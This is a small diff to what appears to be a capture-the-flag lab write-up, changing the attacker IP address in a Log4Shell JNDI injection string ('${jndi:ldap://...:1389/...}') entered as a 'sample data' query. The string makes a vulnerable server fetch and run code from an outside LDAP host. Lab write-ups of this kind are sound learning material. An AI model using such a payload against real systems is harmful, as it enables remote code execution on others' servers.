@@ -44,7 +44,7 @@ NOTE: While suggesting otherwise the option `JDK 1.8` was not working for me.
 
 We add a query in `sample data`:
 ```sh
-${jndi:ldap://10.10.14.7:1389/57sbhf}
+${jndi:ldap://10.10.17.169:1389/57sbhf}
 ```
 ![db query](../img/db_query.png)
 
